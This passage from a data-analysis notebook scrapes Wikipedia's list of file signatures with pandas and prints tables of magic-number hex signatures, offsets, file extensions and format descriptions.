# 119                         Emulator Emaxsynth samples                  RU1YMg
# 120                         Emulator III synth samples                  RU1VMw
# 121                                   Lua bytecode[43]                  G0x1YQ
# 122               macOS file Alias[44] (Symbolic link)  Ym9va2Jvb2sAAAAAbWFyaw
# 123  Microsoft Zone Identifier for URL Security Zon...     W1pvbmVUcmFuc2Zlcl0
# 124                             Email Message var5[46]             UmVjZWl2ZWQ
# 125                                 Tableau Datasource        IAIBYqAeqwcCAAAA
# 126                  Zstandard compressed file[47][48]                  KLUv/Q

# %%
def hex_sig_converter(cell):
    import re
    if('(' in cell):
        return re.sub('\s*\([^)]+\)\s*', '\n', cell)
    else:
        return cell

def extension_converter(cell):
    from textwrap import wrap
    if(cell and cell.strip() and len(cell) >= 6 and ' ' not in cell):
        return cell[0:3]
    else:
        return cell
                             

file_sigs_tables2 = pd.read_html('https://en.wikipedia.org/wiki/List_of_file_signatures', 
                                header=0, converters={'Hex signature':hex_sig_converter, 'File extension':extension_converter}, encoding=None)
file_sigs_tables2[0]
# Out:
#                                                                                       Hex signature  \
# 0                                                                           a1 b2 c3 d4 d4 c3 b2 a1
# 1                                                                                       0a 0d 0d 0a
# 2                                                                                       ed ab ee db
# 3                                                                                       53 50 30 31
# 4                                                                                                00
# 5                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
# 6                                                                                       BE BA FE CA
# 7                                                                                       00 01 42 44
# 8                                                                                       00 01 44 54
# 9                                                                                       00 01 00 00
# 10                                                                                      00 00 01 00
# 11                                                                                66 74 79 70 33 67
# 12                                                                                            1F 9D
# 13                                                                                            1F A0
# 14                                                              42 41 43 4B 4D 49 4B 45 44 49 53 4B
# 15                                                                                         42 5A 68
# 16                                                              47 49 46 38 37 61 47 49 46 38 39 61
# 17                                                                       49 49 2A 00\n4D 4D 00 2A\n
# 18                                                                    49 49 2A 00 10 00 00 00 43 52
# 19                                                                                      80 2A 5F D7
# 20                                                                          52 4E 43 01 52 4E 43 02
# 21                                                                       53 44 50 58\n58 50 44 53\n
# 22                                                                                      76 2F 31 01
# 23                                                                                      42 50 47 FB
# 24   FF D8 FF DB FF D8 FF E0 00 10 4A 46 49 46 00 01FF D8 FF EE FF D8 FF E1 ?? ?? 45 78 69 66 00 00
# 25                                                              46 4F 52 4D ?? ?? ?? ?? 49 4C 42 4D
# 26                                                              46 4F 52 4D ?? ?? ?? ?? 38 53 56 58
# 27                                                              46 4F 52 4D ?? ?? ?? ?? 41 43 42 4D
# 28                                                              46 4F 52 4D ?? ?? ?? ?? 41 4E 42 4D
# 29                                                              46 4F 52 4D ?? ?? ?? ?? 41 4E 49 4D
# 30                                                              46 4F 52 4D ?? ?? ?? ?? 46 41 58 58
# 31                                                              46 4F 52 4D ?? ?? ?? ?? 46 54 58 54
# 32                                                              46 4F 52 4D ?? ?? ?? ?? 53 4D 55 53
# 33                                                              46 4F 52 4D ?? ?? ?? ?? 43 4D 55 53
# 34                                                              46 4F 52 4D ?? ?? ?? ?? 59 55 56 4E
# 35                                                              46 4F 52 4D ?? ?? ?? ?? 46 41 4E 54
# 36                                                              46 4F 52 4D ?? ?? ?? ?? 41 49 46 46
# 37                                                                                      49 4E 44 58
# 38                                                                                      4C 5A 49 50
# 39                                                                                            4D 5A
# 40                                                           50 4B 03 04 50 4B 05 06\n50 4B 07 08\n
# 41                                                                             52 61 72 21 1A 07 00
# 42                                                                          52 61 72 21 1A 07 01 00
# 43                                                                                      7F 45 4C 46
# 44                                                                          89 50 4E 47 0D 0A 1A 0A
# 45                                                                                      CA FE BA BE
# 46                                                                                         EF BB BF
# 47                                                                                      FE ED FA CE
# 48                                                                                      FE ED FA CF
# 49                                                                                      CE FA ED FE
# 50                                                                                      CF FA ED FE
# 51                                                                                            FF FE
# 52                                                                                      FF FE 00 00
# 53                                                                                      25 21 50 53
# 54                                                                                25 50 44 46 2d 0a
# 55                                                  30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C
# 56                                                                          24 53 44 49 30 30 30 31
# 57                                                                                      4F 67 67 53
# 58                                                                                      38 42 50 53
# 59                                                              52 49 46 46 ?? ?? ?? ?? 57 41 56 45
# 60                                                              52 49 46 46 ?? ?? ?? ?? 41 56 49 20
# 61                                                                                            FF FB
# 62                                                                                         49 44 33
# 63                                                                                            42 4D
# 64                                                                                   43 44 30 30 31
# 65        53 49 4D 50 4C 45 20 20 3D 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 54
# 66                                                                                      66 4C 61 43
# 67                                                                                      4D 54 68 64
# 68                                                                          D0 CF 11 E0 A1 B1 1A E1
# 69                                                                          64 65 78 0A 30 33 35 00
# 70                                                                                         4B 44 4D
# 71                                                                                      43 72 32 34
# 72                                                                                      41 47 44 33
# 73                                05 07 00 00 42 4F 42 4F 05 07 00 00 00 00 00 00 00 00 00 00 00 01
# 74                                06 07 E1 00 42 4F 42 4F 06 07 E1 00 00 00 00 00 00 00 00 00 00 01
# 75                                                           45 52 02 00 00 00 8B 45 52 02 00 00 00
# 76                                                                             78 01 73 0D 62 62 60
# 77                                                                                      78 61 72 21
# 78                                                                          50 4D 4F 43 43 4D 4F 43
# 79                                                                                      4E 45 53 1A
# 80                                                  75 73 74 61 72 00 30 30 75 73 74 61 72 20 20 00
# 81                                                                                      74 6F 78 33
# 82                                                                                      4D 4C 56 49
# 83                                                                          44 43 4D 01 50 41 33 30
# 84                                                                                37 7A BC AF 27 1C
# 85                                                                                            1F 8B
# 86                                                                             FD 37 7A 58 5A 00 00
# 87                                                                                      04 22 4D 18
# 88                                                                                      4D 53 43 46
# 89                                                                          53 5A 44 44 88 F0 27 33
# 90                                                                                      46 4C 49 46
# 91                                                                                      1A 45 DF A3
# 92                                                                                      4D 49 4C 20
# 93                                                     41 54 26 54 46 4F 52 4D ?? ?? ?? ?? 44 4A 56
# 94                                                                                            30 82
# 95                                                                                      44 49 43 4D
# 96                                                                                      77 4F 46 46
# 97                                                                                      77 4F 46 32
# 98                                                                                3c 3f 78 6d 6c 20
# 99                                                                                      00 61 73 6d
# 100                                                                                        cf 84 01
# 101                                                                               43 57 53 46 57 53
# 102                                                                            21 3C 61 72 63 68 3E
# 103                                                             52 49 46 46 ?? ?? ?? ?? 57 45 42 50
# 104                                                                                     27 05 19 56
# 105                                                                               7B 5C 72 74 66 31
# 106                                                                                     54 41 50 45
# 107                                                                                              47
# 108                                                                                     00 00 01 BA
# 109                                                                        00 00 01 BA4700 00 01 B3
# 110                                                                                 78 0178 9C78 DA
# 111                                                                                     62 76 78 32
# 112                                                                                        4F 52 43
# 113                                                                                     4F 62 6A 01
# 114                                                                                     53 45 51 36
# 115                                                                                     65 87 78 56
# 116                                                                                     55 55 aa aa
# 117                                                                                        78 56 34
# 118                                                                                     50 41 52 31
# 119                                                                                     45 4D 58 32
# 120                                                                                     45 4D 55 33
# 121                                                                                     1B 4C 75 61
# 122                                                 62 6F 6F 6B 62 6F 6F 6B 00 00 00 00 6D 61 72 6B
# 123                                                       5B 5A 6F 6E 65 54 72 61 6E 73 66 65 72 5D
# 124                                                                         52 65 63 65 69 76 65 64
# 125                                                             20 02 01 62 A0 1E AB 07 02 00 00 00
# 126                                                                                     28 B5 2F FD
#
#                              ISO 8859-1                               Offset  \
# 0                             ¡²ÃÔ ÔÃ²¡                                    0
# 1                                  ....                                    0
# 2                                  ....                                    0
# 3                                  SP01                                    0
# 4                                     .                                    0
# 5            ........ ........ ........                                   11
# 6                                   ...                                    0
# 7                                  ..BD                                    0
# 8                                  ..DT                                    0
# 9                                   ...                                    0
# 10                                 ....                                    0
# 11                               ftyp3g                                    4
# 12                                   ..                                    0
# 13                                   ..                                    0
# 14                        BACKMIKE DISK                                    0
# 15                                  BZh                                    0
# 16                        GIF87a GIF89a                                    0
# 17                            II*. MM.*                                    0
# 18                          II*..... CR                                    0
# 19                                 .*_.                                    0
# 20                                 RNC.                                    0
# 21                            SDPX XPDS                                    0
# 22                                 v/1.                                    0
# 23                                 BPGû                                    0
# 24   ÿØÿÛ ÿØÿà..JFIF..ÿØÿî ÿØÿá..Exif..                                    0
# 25                        FORM.... ILBM                                0 any
# 26                        FORM.... 8SVX                                0 any
# 27                        FORM.... ACBM                                0 any
# 28                        FORM.... ANBM                                0 any
# 29                        FORM.... ANIM                                0 any
# 30                        FORM.... FAXX                                0 any
# 31                        FORM.... FTXT                                0 any
# 32                        FORM.... SMUS                                0 any
# 33                        FORM.... CMUS                                0 any
# 34                        FORM.... YUVN                                0 any
# 35                        FORM.... FANT                                0 any
# 36                        FORM.... AIFF                                0 any
# 37                                 INDX                                    0
# 38                                 LZIP                                    0
# 39                                   MZ                                    0
# 40                                 PK..                                    0
# 41                              Rar!...                                    0
# 42                             Rar!....                                    0
# 43                                 .ELF                                    0
# 44                             .PNG....                                    0
# 45                                 Êþº¾                                    0
# 46                                  ï»¿                                    0
# 47                             ........                             0 0x1000
# 48                             ........                             0 0x1000
# 49                             ........                                    0
# 50                             ........                                    0
# 51                                   ..                                    0
# 52                                 ....                                    0
# 53                                 %!PS                                    0
# 54                                %PDF-                                    0
# 55                    0&²u.fÏ .¦Ù.ª.bÎl                                    0
# 56                             $SDI0001                                    0
# 57                                 OggS                                    0
# 58                                 8BPS                                    0
# 59                        RIFF.... WAVE                                    0
# 60                        RIFF.... AVI.                                    0
# 61                                   ÿû                                    0
# 62                                  ID3                                    0
# 63                                   BM                                    0
# 64                                CD001                  0x8001 0x88010x9001
# 65                           SIMPLE = T                                    0
# 66                                 fLaC                                    0
# 67                                 MThd                                    0
# 68                                  NaN                                    0
# 69                             dex.035.                                    0
# 70                                  KDM                                    0
# 71                                 Cr24                                    0
# 72                                 AGD3                                    0
# 73               ....BOBO ........ ....                                    0
# 74               ....BOBO ........ ....                                    0
# 75                       ER.... ãER....                                    0
# 76                              x.s.bb`                                    0
# 77                                 xar!                                    0
# 78                             PMOCCMOC                                    0
# 79                                  NES                                    0
# 80                     ustar.00 ustar .                                0x101
# 81                                  TOX                                    0
# 82                                 MLVI                                    0
# 83                             DCM PA30                                    0
# 84                                7z¼¯'                                    0
# 85                                   ..                                    0
# 86                              ²7zXZ..                                    0
# 87                                 ."M.                                    0
# 88                                 MSCF                                    0
# 89                             SZDD....                                    0
# 90                                 FLIF                                    0
# 91                                 .Eß£                                    0
# 92                                  MIL                                    0
# 93                      AT&TFORM....DJV                                    0
# 94                                   0.                                    0
# 95                                 DICM                                 0x80
# 96                                 wOFF                                    0
# 97                                 wOF2                                    0
# 98                                <?xml                                    0
# 99                                 .asm                                    0
# 100                                 NaN                                    0
# 101                             CWS FWS                                    0
# 102                            !<arch>.                                    0
# 103                       RIFF.... WEBP                                    0
# 104                                '..V                                    0
# 105                              {\rtf1                                    0
# 106                                TAPE                                    0
# 107                                   G  0 0xBC 0x178 ... (every 188th byte)
# 108                                ....                                    0
# 109                           ....G....                                    0
# 110                                ....                                    0
# 111                                bvx2                                    0
# 112                                 ORC                                    0
# 113                                Obj.                                    0
# 114                                SEQ6                                    0
# 115                                e.xV                                    0
# 116                                UU¬¬                                    0
# 117                                 xV4                                    0
# 118                                PAR1                                    0
# 119                                EMX2                                    0
# 120                                EMU3                                    0
# 121                                .Lua                                    0
# 122                           book mark                                    0
# 123                      [ZoneTransfer]                                    0
# 124                           Received:                                    0
# 125                         ..b .«.....                                    0
# 126                                (µ/ý                                    0
#
#                                                                                                                   File extension  \
# 0                                                                                                                           pcap
# 1                                                                                                                            pca
# 2                                                                                                                            rpm
# 3                                                                                                                            bin
# 4                                                                                                                            PIC
# 5                                                                                                                            PDB
# 6                                                                                                                            DBA
# 7                                                                                                                            DBA
# 8                                                                                                                            TDA
# 9                                                                                                                            NaN
# 10                                                                                                                           ico
# 11                                                                                                                           3gp
# 12                                                                                                                           zta
# 13                                                                                                                           zta
# 14                                                                                                                           bac
# 15                                                                                                                           bz2
# 16                                                                                                                           gif
# 17                                                                                                                           tif
# 18                                                                                                                           cr2
# 19                                                                                                                           cin
# 20                                                                                                                           NaN
# 21                                                                                                                           dpx
# 22                                                                                                                           exr
# 23                                                                                                                           bpg
# 24                                                                                                                           jpg
# 25                                                                                                                           ilb
# 26                                                                                                                           8sv
# 27                                                                                                                           acb
# 28                                                                                                                           anb
# 29                                                                                                                           ani
# 30                                                                                                                           fax
# 31                                                                                                                           ftx
# 32                                                                                                                           smu
# 33                                                                                                                           cmu
# 34                                                                                                                           yuv
# 35                                                                                                                           iff
# 36                                                                                                                           aif
# 37                                                                                                                           idx
# 38                                                                                                                            lz
# 39                                                                                                                           exe
# 40                                                                                                                           zip
# 41                                                                                                                           rar
# 42                                                                                                                           rar
# 43                                                                                                                           NaN
# 44                                                                                                                           png
# 45                                                                                                                         class
# 46                                                                                                                           NaN
# 47                                                                                                                           NaN
# 48                                                                                                                           NaN
# 49                                                                                                                           NaN
# 50                                                                                                                           NaN
# 51                                                                                                                           NaN
# 52                                                                                                                           NaN
# 53                                                                                                                            ps
# 54                                                                                                                           pdf
# 55                                                                                                                           asf
# 56                                                                                                                           NaN
# 57                                                                                                                           ogg
# 58                                                                                                                           psd
# 59                                                                                                                           wav
# 60                                                                                                                           avi
# 61                                                                                                                           mp3
# 62                                                                                                                           mp3
# 63                                                                                                                           bmp
# 64                                                                                                                           iso
# 65                                                                                                                          fits
# 66                                                                                                                          flac
# 67                                                                                                                           mid
# 68                                                                                                                           doc
# 69                                                                                                                           dex
# 70                                                                                                                          vmdk
# 71                                                                                                                           crx
# 72                                                                                                                           fh8
# 73                                                                                                                           cwk
# 74                                                                                                                           cwk
# 75                                                                                                                         toast
# 76                                                                                                                           dmg
# 77                                                                                                                           xar
# 78                                                                                                                           dat
# 79                                                                                                                           nes
# 80                                                                                                                           tar
# 81                                                                                                                           tox
# 82                                                                                                                           MLV
# 83                                                                                                                           NaN
# 84                                                                                                                            7z
# 85                                                                                                                           gzt
# 86                                                                                                                           xzt
# 87                                                                                                                           lz4
# 88                                                                                                                           cab
# 89   Various. (Replacing the last character of the original file extension with an underscore, e.g. setup.exe becomes setup.ex_)
# 90                                                                                                                          flif
# 91                                                                                                                           mkv
# 92                                                                                                                           stg
# 93                                                                                                                           djv
# 94                                                                                                                           der
# 95                                                                                                                           dcm
# 96                                                                                                                          woff
# 97                                                                                                                         woff2
# 98                                                                                                                           XML
# 99                                                                                                                          wasm
# 100                                                                                                                          lep
# 101                                                                                                                          swf
# 102                                                                                                                          deb
# 103                                                                                                                         webp
# 104                                                                                                                          NaN
# 105                                                                                                                          rtf
# 106                                                                                                                          NaN
# 107                                                                                                                   ts tsv tsa
# 108                                                                                                                      m2p vob
# 109                                                                                                                     mpg mpeg
# 110                                                                                                                         zlib
# 111                                                                                                                        lzfse
# 112                                                                                                                          orc
# 113                                                                                                                         avro
# 114                                                                                                                           rc
# 115                                                                                                                      p25 obt
# 116                                                                                                                          pcv
# 117                                                                                     pbt pdt pea peb pet pgt pict pjt pkt pmt
# 118                                                                                                                          NaN
# 119                                                                                                                          ez2
# 120                                                                                                                      ez3 iso
# 121                                                                                                                         luac
# 122                                                                                                                        alias
# 123                                                                                                                          Ide
# 124                                                                                                                          eml
# 125                                                                                                                          tde
# 126                                                                                                                          zst
#
#                                                                                                                                                                        Description
# 0                                                                                                                                                           Libpcap File Format[1]
# 1                                                                                                                                         PCAP Next Generation Dump File Format[2]
# 2                                                                                                                                         RedHat Package Manager (RPM) package [3]
# 3                                                                                                                                                 Amazon Kindle Update Package [4]
# 4                                                               IBM Storyboard bitmap file Windows Program Information File Mac Stuffit Self-Extracting Archive IRIS OCR data file
# 5                                                                                                                                                 PalmPilot Database/Document File
# 6                                                                                                                                                    Palm Desktop Calendar Archive
# 7                                                                                                                                                       Palm Desktop To Do Archive
# 8                                                                                                                                                    Palm Desktop Calendar Archive
# 9                                                                                                                                           Palm Desktop Data File (Access format)
# 10                                                                                                                                     Computer icon encoded in ICO file format[5]
# 11                                                                                                              3rd Generation Partnership Project 3GPP and 3GPP2 multimedia files
# 12                                                                                                                compressed file (often tar zip) using Lempel-Ziv-Welch algorithm
# 13                                                                                                                             Compressed file (often tar zip) using LZH algorithm
# 14                                     File or tape containing a backup done with AmiBack on an Amiga. It typically is paired with an index file (idx) with the table of contents.
# 15                                                                                                                                           Compressed file using Bzip2 algorithm
# 16                                                                                                                  Image file encoded in the Graphics Interchange Format (GIF)[6]
# 17                                                                                                                                                        Tagged Image File Format
# 18                                                                                             Canon RAW Format Version 2[7]Canon's RAW format is based on the TIFF file format[8]
# 19                                                                                                                                                              Kodak Cineon image
# 20                                                                                                       Compressed file using Rob Northen Compression (version 1 and 2) algorithm
# 21                                                                                                                                                                 SMPTE DPX image
# 22                                                                                                                                                                   OpenEXR image
# 23                                                                                                                                              Better Portable Graphics format[9]
# 24                                                                                                                                     JPEG raw or in the JFIF or Exif file format
# 25                                                                                                                                                    IFF Interleaved Bitmap Image
# 26                                                                                                                                                         IFF 8-Bit Sampled Voice
# 27                                                                                                                                                         Amiga Contiguous Bitmap
# 28                                                                                                                                                             IFF Animated Bitmap
# 29                                                                                                                                                               IFF CEL Animation
# 30                                                                                                                                                             IFF Facsimile Image
# 31                                                                                                                                                              IFF Formatted Text
# 32                                                                                                                                                        IFF Simple Musical Score
# 33                                                                                                                                                               IFF Musical Score
# 34                                                                                                                                                                   IFF YUV Image
# 35                                                                                                                                                         Amiga Fantavision Movie
# 36                                                                                                                                                   Audio Interchange File Format
# 37                                                                                                 Index file to a file or tape containing a backup done with AmiBack on an Amiga.
# 38                                                                                                                                                            lzip compressed file
# 39                                                                                                         DOS MZ executable file format and its descendants (including NE and PE)
# 40                                                                                                                zip file format and formats based on it, such as JAR, ODF, OOXML
# 41                                                                                                                                            RAR archive version 1.50 onwards[10]
# 42                                                                                                                                             RAR archive version 5.0 onwards[11]
# 43                                                                                                                                                  Executable and Linkable Format
# 44                                                                                                                       Image encoded in the Portable Network Graphics format[12]
# 45                                                                                                                                              Java class file, Mach-O Fat Binary
# 46                                                                                                             UTF-8 encoded Unicode byte order mark, commonly seen in text files.
# 47                                                                                                                                                          Mach-O binary (32-bit)
# 48                                                                                                                                                          Mach-O binary (64-bit)
# 49                                                                                                                        Mach-O binary (reverse byte ordering scheme, 32-bit)[13]
# 50                                                                                                                        Mach-O binary (reverse byte ordering scheme, 64-bit)[13]
# 51                                                                                           Byte-order mark for text file encoded in little-endian 16-bit Unicode Transfer Format
# 52                                                                                           Byte-order mark for text file encoded in little-endian 32-bit Unicode Transfer Format
# 53                                                                                                                                                             PostScript document
# 54                                                                                                                                                                PDF document[14]
# 55                                                                                                                                                     Advanced Systems Format[15]
# 56                                                                                                                  System Deployment Image, a disk image format used by Microsoft
# 57                                                                                                                                      Ogg, an open source media container format
# 58                                                                                                                   Photoshop Document file, Adobe Photoshop's native file format
# 59                                                                                                                                                      Waveform Audio File Format
# 60                                                                                                                                             Audio Video Interleave video format
# 61                                                                           MPEG-1 Layer 3 file without an ID3 tag or with an ID3v1 tag (which's appended at the end of the file)
# 62                                                                                                                                                MP3 file with an ID3v2 container
# 63                                                                                                                      BMP file, a bitmap format used mostly in the Windows world
# 64                                                                                                                                                   ISO9660 CD/DVD image file[16]
# 65                                                                                                                                      Flexible Image Transport System (FITS)[17]
# 66                                                                                                                                                   Free Lossless Audio Codec[18]
# 67                                                                                                                                                             MIDI sound file[19]
# 68       Compound File Binary Format, a container format used for document by older versions of Microsoft Office.[20] It is however an open format used by other programs as well.
# 69                                                                                                                                                               Dalvik Executable
# 70                                                                                                                                                              VMDK files[21][22]
# 71                                                                                                                                 Google Chrome extension[23] or packaged app[24]
# 72                                                                                                                                                 FreeHand 8 document[25][26][27]
# 73                                                                                                                                                           AppleWorks 5 document
# 74                                                                                                                                                           AppleWorks 6 document
# 75                                                                                                         Roxio Toast disc image file, also some .dmg-files begin with same bytes
# 76                                                                                                                                                           Apple Disk Image file
# 77                                                                                                                                                   eXtensible ARchive format[28]
# 78                                                          Windows Files And Settings Transfer Repository[29] See also USMT 3.0 (Win XP)[30] and USMT 4.0 (Win 7)[31] User Guides
# 79                                                                                                                                      Nintendo Entertainment System ROM file[32]
# 80                                                                                                                                                                 tar archive[33]
# 81                                                                                                                                             Open source portable voxel file[34]
# 82                                                                                                                                                    Magic Lantern Video file[35]
# 83                                                                                                                                     Windows Update Binary Delta Compression[36]
# 84                                                                                                                                                               7-Zip File Format
# 85                                                                                                                                                        GZIP compressed file[37]
# 86                                                                                                                                  XZ compression utility using LZMA2 compression
# 87                                                                                               LZ4 Frame Format[38] Remark: LZ4 block format does not offer any magic bytes.[39]
# 88                                                                                                                                                          Microsoft Cabinet file
# 89   Microsoft compressed file in Quantum format, used prior to Windows XP. File can be decompressed using Extract.exe or Expand.exe distributed with earlier versions of Windows.
# 90                                                                                                                                                      Free Lossless Image Format
# 91                                                                                                                                        Matroska media container, including WebM
# 92                                  "SEAN : Session Analysis" Training file. Also used in compatible software "Rpw : Rowperfect for Windows" and "RP3W : ROWPERFECT3 for Windows".
# 93                                                                            DjVu documentThe following byte is either 55 (U) for single-page or 4D (M) for multi-page documents.
# 94                                                                                                                                                   DER encoded X.509 certificate
# 95                                                                                                                                                       DICOM Medical File Format
# 96                                                                                                                                                            WOFF File Format 1.0
# 97                                                                                                                                                            WOFF File Format 2.0
# 98                                                                                                              eXtensible Markup Language when using the ASCII character encoding
# 99                                                                                                                                                   WebAssembly binary format[40]
# 100                                                                                                                                               Lepton compressed JPEG image[41]
# 101                                                                                                                                                                     flash .swf
# 102                                                                                                                                                                 linux deb file
# 103                                                                                                                                                         Google WebP image file
# 104                                                                                                                         U-Boot / uImage. Das U-Boot Universal Boot Loader.[42]
# 105                                                                                                                                                               Rich Text Format
# 106                                                                                                                                                          Microsoft Tape Format
# 107                                                                                                                                          MPEG Transport Stream (MPEG-2 Part 1)
# 108                                                                                                  MPEG Program Stream (MPEG-1 Part 1 (essentially identical) and MPEG-2 Part 1)
# 109                                                                      MPEG Program Stream MPEG Transport Stream MPEG-1 video and MPEG-2 video (MPEG-1 Part 2 and MPEG-2 Part 2)
# 110                                                                                                                        No Compression/low Default Compression Best Compression
# 111                                                                       LZFSE - Lempel-Ziv style data compression algorithm using Finite State Entropy coding. OSS by Apple.[43]
# 112                                                                                                                                Apache ORC (Optimized Row Columnar) file format
# 113                                                                                                                                                 Apache Avro binary file format
# 114                                                                                                                                                    RCFile columnar file format
# 115                                                                                                                                                      PhotoCap Object Templates
# 116                                                                                                                                                                PhotoCap Vector
# 117                                                                                                                                                              PhotoCap Template
# 118                                                                                                                                            Apache Parquet columnar file format
# 119                                                                                                                                                     Emulator Emaxsynth samples
# 120                                                                                                                                                     Emulator III synth samples
# 121                                                                                                                                                               Lua bytecode[44]
# 122                                                                                                                                           macOS file Alias[45] (Symbolic link)
# 123                                                                                                                           Microsoft Zone Identifier for URL Security Zones[46]
# 124                                                                                                                                                         Email Message var5[47]
# 125                                                                                                                                                             Tableau Datasource
# 126                                                                                                                                              Zstandard compressed file[48][49]

# %%
pd.set_option('display.max_rows', 500)
pd.set_option('display.max_columns', 50)
pd.set_option('display.max_colwidth', 200)
file_sigs_tables[0]
# Out:
#                                                                                       Hex signature  \
# 0                                                                           a1 b2 c3 d4 d4 c3 b2 a1
# 1                                                                                       0a 0d 0d 0a
# 2                                                                                       ed ab ee db
# 3                                                                                       53 50 30 31
# 4                                                                                                00
# 5                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
# 6                                                                                       BE BA FE CA
# 7                                                                                       00 01 42 44
# 8                                                                                       00 01 44 54
# 9                                                                                       00 01 00 00
# 10                                                                                      00 00 01 00
# 11                                                                                66 74 79 70 33 67
# 12                                                                                            1F 9D
# 13                                                                                            1F A0
# 14                                                              42 41 43 4B 4D 49 4B 45 44 49 53 4B
# 15                                                                                         42 5A 68
# 16                                                              47 49 46 38 37 61 47 49 46 38 39 61
# 17                                49 49 2A 00 (little endian format)4D 4D 00 2A (big endian format)
# 18                                                                    49 49 2A 00 10 00 00 00 43 52
# 19                                                                                      80 2A 5F D7
# 20                                                                          52 4E 43 01 52 4E 43 02
# 21                               53 44 50 58 (big endian format) 58 50 44 53 (little endian format)
# 22                                                                                      76 2F 31 01
# 23                                                                                      42 50 47 FB
# 24   FF D8 FF DB FF D8 FF E0 00 10 4A 46 49 46 00 01FF D8 FF EE FF D8 FF E1 ?? ?? 45 78 69 66 00 00
# 25                                                              46 4F 52 4D ?? ?? ?? ?? 49 4C 42 4D
# 26                                                              46 4F 52 4D ?? ?? ?? ?? 38 53 56 58
# 27                                                              46 4F 52 4D ?? ?? ?? ?? 41 43 42 4D
# 28                                                              46 4F 52 4D ?? ?? ?? ?? 41 4E 42 4D
# 29                                                              46 4F 52 4D ?? ?? ?? ?? 41 4E 49 4D
# 30                                                              46 4F 52 4D ?? ?? ?? ?? 46 41 58 58
# 31                                                              46 4F 52 4D ?? ?? ?? ?? 46 54 58 54
# 32                                                              46 4F 52 4D ?? ?? ?? ?? 53 4D 55 53
# 33                                                              46 4F 52 4D ?? ?? ?? ?? 43 4D 55 53
# 34                                                              46 4F 52 4D ?? ?? ?? ?? 59 55 56 4E
# 35                                                              46 4F 52 4D ?? ?? ?? ?? 46 41 4E 54
# 36                                                              46 4F 52 4D ?? ?? ?? ?? 41 49 46 46
# 37                                                                                      49 4E 44 58
# 38                                                                                      4C 5A 49 50
# 39                                                                                            4D 5A
# 40                            50 4B 03 04 50 4B 05 06 (empty archive) 50 4B 07 08 (spanned archive)
# 41                                                                             52 61 72 21 1A 07 00
# 42                                                                          52 61 72 21 1A 07 01 00
# 43                                                                                      7F 45 4C 46
# 44                                                                          89 50 4E 47 0D 0A 1A 0A
# 45                                                                                      CA FE BA BE
# 46                                                                                         EF BB BF
# 47                                                                                      FE ED FA CE
# 48                                                                                      FE ED FA CF
# 49                                                                                      CE FA ED FE
# 50                                                                                      CF FA ED FE
# 51                                                                                            FF FE
# 52                                                                                      FF FE 00 00
# 53                                                                                      25 21 50 53
# 54                                                                                25 50 44 46 2d 0a
# 55                                                  30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C
# 56                                                                          24 53 44 49 30 30 30 31
# 57                                                                                      4F 67 67 53
# 58                                                                                      38 42 50 53
# 59                                                              52 49 46 46 ?? ?? ?? ?? 57 41 56 45
# 60                                                              52 49 46 46 ?? ?? ?? ?? 41 56 49 20
# 61                                                                                            FF FB
# 62                                                                                         49 44 33
# 63                                                                                            42 4D
# 64                                                                                   43 44 30 30 31
# 65        53 49 4D 50 4C 45 20 20 3D 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 54
# 66                                                                                      66 4C 61 43
# 67                                                                                      4D 54 68 64
# 68                                                                          D0 CF 11 E0 A1 B1 1A E1
# 69                                                                          64 65 78 0A 30 33 35 00
# 70                                                                                         4B 44 4D
# 71                                                                                      43 72 32 34
# 72                                                                                      41 47 44 33
# 73                                05 07 00 00 42 4F 42 4F 05 07 00 00 00 00 00 00 00 00 00 00 00 01
# 74                                06 07 E1 00 42 4F 42 4F 06 07 E1 00 00 00 00 00 00 00 00 00 00 01
# 75                                                           45 52 02 00 00 00 8B 45 52 02 00 00 00
# 76                                                                             78 01 73 0D 62 62 60
# 77                                                                                      78 61 72 21
# 78                                                                          50 4D 4F 43 43 4D 4F 43
# 79                                                                                      4E 45 53 1A
# 80                                                  75 73 74 61 72 00 30 30 75 73 74 61 72 20 20 00
# 81                                                                                      74 6F 78 33
# 82                                                                                      4D 4C 56 49
# 83                                                                          44 43 4D 01 50 41 33 30
# 84                                                                                37 7A BC AF 27 1C
# 85                                                                                            1F 8B
# 86                                                                             FD 37 7A 58 5A 00 00
# 87                                                                                      04 22 4D 18
# 88                                                                                      4D 53 43 46
# 89                                                                          53 5A 44 44 88 F0 27 33
# 90                                                                                      46 4C 49 46
# 91                                                                                      1A 45 DF A3
# 92                                                                                      4D 49 4C 20
# 93                                                     41 54 26 54 46 4F 52 4D ?? ?? ?? ?? 44 4A 56
# 94                                                                                            30 82
# 95                                                                                      44 49 43 4D
# 96                                                                                      77 4F 46 46
# 97                                                                                      77 4F 46 32
# 98                                                                                3c 3f 78 6d 6c 20
# 99                                                                                      00 61 73 6d
# 100                                                                                        cf 84 01
# 101                                                                               43 57 53 46 57 53
# 102                                                                            21 3C 61 72 63 68 3E
# 103                                                             52 49 46 46 ?? ?? ?? ?? 57 45 42 50
# 104                                                                                     27 05 19 56
# 105                                                                               7B 5C 72 74 66 31
# 106                                                                                     54 41 50 45
# 107                                                                                              47
# 108                                                                                     00 00 01 BA
# 109                                                                        00 00 01 BA4700 00 01 B3
# 110                                                                                 78 0178 9C78 DA
# 111                                                                                     62 76 78 32
# 112                                                                                        4F 52 43
# 113                                                                                     4F 62 6A 01
# 114                                                                                     53 45 51 36
# 115                                                                                     65 87 78 56
# 116                                                                                     55 55 aa aa
# 117                                                                                        78 56 34
# 118                                                                                     50 41 52 31
# 119                                                                                     45 4D 58 32
# 120                                                                                     45 4D 55 33
# 121                                                                                     1B 4C 75 61
# 122                                                 62 6F 6F 6B 62 6F 6F 6B 00 00 00 00 6D 61 72 6B
# 123                                                       5B 5A 6F 6E 65 54 72 61 6E 73 66 65 72 5D
# 124                                                                         52 65 63 65 69 76 65 64
# 125                                                             20 02 01 62 A0 1E AB 07 02 00 00 00
# 126                                                                                     28 B5 2F FD
#
#                              ISO 8859-1                               Offset  \
# 0                             ¡²ÃÔ ÔÃ²¡                                    0
# 1                                  ....                                    0
# 2                                  ....                                    0
# 3                                  SP01                                    0
# 4                                     .                                    0
# 5            ........ ........ ........                                   11
# 6                                   ...                                    0
# 7                                  ..BD                                    0
